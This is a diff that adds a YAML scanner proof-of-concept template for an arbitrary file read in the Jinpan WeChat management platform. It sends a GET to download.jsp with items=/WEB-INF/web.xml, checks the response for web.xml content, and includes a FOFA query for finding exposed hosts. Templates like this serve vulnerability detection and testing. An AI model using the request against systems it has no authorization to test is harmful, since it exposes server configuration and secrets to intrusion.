@@ -1,0 +1,22 @@
+id: poc-yaml-jinpan-wechat-download-jsp-anyfile-read
+info:
+  name: 金盘微信管理平台 download.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金盘微信管理平台
+  fofa: title=="微信管理后台"
+requests:
+- method: GET
+  path: /mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"web-app") &&
+
+    contains(body,"<filter>") &&
+
+    contains(headers,"filename=\"web.xml\"")
+
+    '
+variables: {}
+transport: http
